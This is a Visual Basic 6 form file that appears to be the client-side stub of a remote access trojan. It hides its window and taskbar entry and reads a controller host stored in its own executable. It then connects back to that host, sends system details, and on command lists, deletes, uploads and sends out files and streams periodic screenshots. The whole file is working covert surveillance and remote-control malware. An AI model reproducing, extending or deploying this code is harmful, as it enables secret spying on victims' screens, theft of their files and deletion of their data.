VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   525
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   1215
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   525
   ScaleWidth      =   1215
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtServerID 
      Height          =   285
      Left            =   0
      TabIndex        =   6
      Top             =   240
      Width           =   1215
   End
   Begin VB.TextBox txtHost 
      Height          =   285
      Left            =   0
      TabIndex        =   5
      Top             =   0
      Width           =   1215
   End
   Begin VB.Timer tmrScreenShot 
      Enabled         =   0   'False
      Left            =   360
      Top             =   0
   End
   Begin VB.Timer tmrConnect 
      Interval        =   15000
      Left            =   -120
      Top             =   0
   End
   Begin VB.FileListBox Files 
      Height          =   285
      Left            =   0
      TabIndex        =   2
      Top             =   480
      Width           =   1215
   End
   Begin VB.DirListBox Directory 
      Height          =   315
      Left            =   0
      TabIndex        =   1
      Top             =   240
      Width           =   1215
   End
   Begin VB.DriveListBox Drives 
      Height          =   315
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   1215
   End
   Begin VB.PictureBox picCap 
      Height          =   13620
      Left            =   -20520
      ScaleHeight     =   13560
      ScaleWidth      =   21660
      TabIndex        =   3
      Top             =   -13080
      Width           =   21720
   End
   Begin VB.PictureBox picScreen 
      Height          =   5295
      Left            =   -6840
      ScaleHeight     =   5235
      ScaleWidth      =   7995
      TabIndex        =   4
      Top             =   -4560
      Width           =   8055
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Private Const VK_SNAPSHOT = &H2C
Dim WithEvents sckConnect As CSocketPlus
Attribute sckConnect.VB_VarHelpID = -1

Const sSplit = "#^#"
Const sChunk = 4096

Dim FF As Integer
Dim dlFile As String
Dim sDownloading As Boolean

Private Sub Form_Initialize()
Dim sInfo As String
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
    sInfo = Space(LOF(1))
    Get #1, , sInfo
Close #1

txtHost.Text = Split(sInfo, sSplit)(1)
txtServerID.Text = Split(sInfo, sSplit)(2)

Set sckConnect = New CSocketPlus

With App
    If .PrevInstance = True Then End
    .TaskVisible = False
    .Title = vbNullString
End With

With Me
    .Visible = False
    .Caption = vbNullString
End With

With sckConnect
    .ArrayAdd 1
    .Connect 1, txtHost.Text, 4180
End With
End Sub

Private Sub sckConnect_Connect(ByVal Index As Variant)
SendData "[CONNECTSTATUS]" & sSplit & txtServerID.Text & sSplit & sckConnect.LocalHostName & sSplit & GetCountry & sSplit & GetPCUptime & " Hours" & sSplit & RAM & sSplit & Time
End Sub

Private Sub sckConnect_DataArrival(ByVal Index As Variant, ByVal bytesTotal As Long)
Dim sData As String
sckConnect.GetData 1, sData

If InStr(sData, "[REFRESHDRIVES]") Then
    SendData "[REFRESHDRIVES]" & sSplit & Drives.ListCount - 1 & sSplit & "|" & ListDrives

ElseIf InStr(sData, "[CHANGEDRIVES]") Then
    Drives.Drive = Split(sData, sSplit)(1)
    Call Drives_Change
    
    SendData "[CHANGEDRIVES]" & sSplit & Directory.ListCount - 1 & sSplit & "|" & ListDirectory
    
ElseIf InStr(sData, "[CHANGEFOLDER]") Then
    Directory.Path = Split(sData, sSplit)(1)
    Files.Path = Directory.Path
    Files.Refresh
    
    SendData "[CHANGEDRIVES]" & sSplit & Directory.ListCount - 1 & sSplit & "|" & ListDirectory
    DoEvents
    SendData "[CHANGEFOLDER]" & sSplit & Files.ListCount - 1 & sSplit & "|" & ListFiles

ElseIf InStr(sData, "[DELETEFILE]") Then
    Kill Split(sData, sSplit)(1) & "\" & Split(sData, sSplit)(2)
    
ElseIf InStr(sData, "[DOWNLOAD]") Then
    dlFile = Split(sData, sSplit)(1) & "\" & Split(sData, sSplit)(2)
    SendData "[FILEINFO]" & sSplit & Split(sData, sSplit)(2)
    
ElseIf InStr(sData, "[STARTDOWNLOAD]") Then
    Dim sFileCont As String
    FF = FreeFile
    Open dlFile For Binary As #FF
        SendData "[LOF]" & sSplit & LOF(FF)
        Do While Not EOF(FF)
            sFileCont = Input(sChunk, #FF)
            SendData sFileCont
            DoEvents
        Loop
    Close #FF
    
    SendData "[ENDOFFILE]"
    
ElseIf InStr(sData, "[STARTSCREENCAPTURE]") Then
    tmrScreenShot.Interval = Split(sData, sSplit)(1) * 1000
    tmrScreenShot.Enabled = True
    
ElseIf InStr(sData, "[STOPSCREENCAPTURE]") Then
    tmrScreenShot.Enabled = False
    
ElseIf InStr(sData, "[STARTUPLOAD]") Then
    Debug.Print sData
    Open Split(sData, sSplit)(1) For Binary As #1
    sDownloading = True

ElseIf InStr(sData, "[ENDOFFILE]") Then
    Close #1
    sDownloading = False

Else
    If sDownloading = True Then
        Put #1, , sData
    End If
End If
End Sub

Private Sub Drives_Change()
Directory.Path = Split(Drives.Drive, ":")(0) & ":\"
End Sub

Function ListDrives() As String
Dim i As Integer
ListDrives = vbNullString
    For i = 0 To Drives.ListCount - 1
        ListDrives = ListDrives & Drives.List(i) & "|"
    Next i
End Function

Function ListDirectory() As String
Dim i As Integer
ListDirectory = vbNullString
    For i = 0 To Directory.ListCount - 1
        ListDirectory = ListDirectory & Directory.List(i) & "|"
    Next i
End Function

Function ListFiles() As String
Dim i As Integer
ListFiles = vbNullString
    For i = 0 To Files.ListCount - 1
        ListFiles = ListFiles & Files.List(i) & "|"
    Next i
End Function

Public Sub SendData(data As String)
sckConnect.SendData 1, data
End Sub

Private Sub tmrConnect_Timer()
If sckConnect.State(1) <> sckConnected Then
    With sckConnect
        .CloseSck 1
        .Connect 1, txtHost.Text, 4180
    End With
End If
End Sub

Private Sub tmrScreenShot_Timer()
keybd_event VK_SNAPSHOT, 0, 0, 0
picCap.Picture = Clipboard.GetData()
DoImage
End Sub

Public Sub DoImage()
With picScreen
    .AutoRedraw = True
    .PaintPicture picCap.Picture, .ScaleLeft, .ScaleTop, .ScaleWidth, .ScaleHeight, picCap.ScaleLeft, picCap.ScaleTop, picCap.ScaleWidth, picCap.ScaleHeight
    .Picture = .Image
End With
SavePicture picScreen.Picture, "C:\tmp.bmp"
dlFile = "C:\tmp.bmp"
sckConnect.SendData 1, "[SCREENINFO]" & sSplit & "tmp.bmp"
Dim sFileCont As String
Open dlFile For Binary As #1
    Do While Not EOF(1)
        sFileCont = Input(sChunk, #1)
        SendData sFileCont
        DoEvents
    Loop
Close #1
SendData "[ENDOFFILE]"
SendData "[SCREENEND]"
End Sub

